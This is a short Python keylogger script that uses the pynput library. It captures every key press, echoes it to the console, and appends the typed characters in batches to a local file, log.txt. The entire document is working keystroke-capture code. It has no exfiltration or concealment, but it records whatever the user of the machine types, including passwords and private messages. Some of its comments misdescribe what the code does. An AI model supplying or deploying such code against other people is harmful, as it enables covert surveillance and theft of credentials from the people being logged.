import pynput
from pynput.keyboard import Key, Listener

keys = []
count = 0


def on_release(key):
    if key == Key.esc:
        return False


def on_press(key):
    print("{} key is pressed".format(key))
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        count = 0
        writefile(keys)
        keys = []


def writefile(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k=str(key).replace("'","")# replacing the single quotes
            if(k.find("space")>0):
                f.write("\n") #If number of "Key.space" occurences are more than 1 then the following keystrokes will be in a new line
            elif(k.find("Key")==-1):
                f.write(k) #If any other "Key." is found ohter than the normal numbers and letters then they wont be recorded as keystrokes in "log.txt"
                
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
